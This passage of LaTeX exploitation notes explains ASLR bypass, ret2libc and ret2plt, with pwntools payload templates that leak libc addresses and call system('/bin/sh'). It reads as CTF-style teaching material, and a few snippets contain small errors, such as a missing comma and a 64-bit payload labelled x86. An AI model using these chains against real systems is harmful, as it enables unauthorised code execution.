\subsection{bypass ASLR}
ASLR can, in most cases, be thought of as \verb+libc+'s equivalent of PIE.

It's tempting to think that, as with PIE, we can simply format string for a
libc address and subtract a static offset from it. Sadly, we can't quite do
that.

When functions finish execution, they do not get removed from memory; instead,
they just get ignored and overwritten. Chances are very high that you will grab
one of these remnants with the format string. Different libc versions can act
very differently during execution, so a value you just grabbed may not even
exist remotely, and if it does the offset will most likely be different
(different libcs have different sizes and therefore different offsets between
functions). It's possible to get lucky, but you shouldn't really hope that the
offsets remain the same.

Instead, a more reliable way is reading the {\bf GOT entry of a specific
function}
For the same reason as PIE, libc base addresses always end in the hexadecimal
characters \verb+000+

\subsubsection{ret2libc with a leak}

\begin{verbatim}
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc

libc.address = fun_leak - libc.sym['fun']
log.success(f'LIBC base: {hex(libc.address)}')

# x86
#payload = flat(
#    'A' * 32,
#    libc.sym['system'],
#    0x0,        # return address
#    next(libc.search(b'/bin/sh'))
#)

# x86
payload = flat(
    'A' * 40,
    0x4011db,                           # pop rdi; ret
    next(libc.search(b'/bin/sh')),
    libc.sym['system']
)
# equivalent with ROP
# binsh = next(libc.search(b'/bin/sh'))
#rop = ROP(libc)
#rop.raw('A' * 32)
#rop.system(binsh)
#p.sendline(rop.chain())
\end{verbatim}


\subsubsection{Reminder on GOT/PLT}


remembering that :
\begin{itemize}
    \item Calling the PLT address of a function is equivalent to calling the
        function itself
    \item The GOT address contains addresses of functions in \verb+libc+, and
        the GOT is within the binary.
\end{itemize}

The use of the first point is clear - if we have a PLT entry for a desirable
libc function, for example i\verb+system+, we can just redirect execution to
its PLT entry and it will be the equivalent of calling system directly; no need
to jump into libc.

The second point is as the GOT is part of the binary, it will always be a
constant offset away from the base (\verb+piebase+). Therefore, if PIE is
disabled or you somehow leak the binary base, you know the exact address that
contains a libc function's address. If you perhaps have an arbitrary read, it's
trivial to leak the real address of the libc function and therefore bypass
ASLR.

\subsubsection{ret2plt}
\verb+ret2plt+ is a common technique that involves calling \verb+puts@plt+ and
passing the GOT entry of puts as a parameter. This causes \verb+puts+ to print
out its own address in libc. 

then it will be possible (knowing the libc version) to compute the libc address
by with \verb+liked_puts - relative_puts+

\begin{verbatim}
elf = context.binary = ELF('./vuln')
libc = elf.libc

# 32-bit ret2plt
payload = flat(
    b'A' * padding,
    elf.plt['puts'],
    elf.symbols['main'],
    elf.got['puts']
)

# 64-bit
payload = flat(
    b'A' * padding,
    POP_RDI,
    elf.got['puts']
    elf.plt['puts'],
    elf.symbols['main'] # return to main
)

libc.address = puts_leak - libc.sym['puts']
\end{verbatim}


\subsubsection{ret2plt remote server}

Note that in case the exploit is made on a remote server the libc version is
unknown therefore in order to find the offset of \verb+puts+ the solution is to
take the leaked address and to search for puts in
\url{https://libc.blukat.me/?q=puts%3A0x7f572f52e6a0} which might provide
    several version of libc matching.
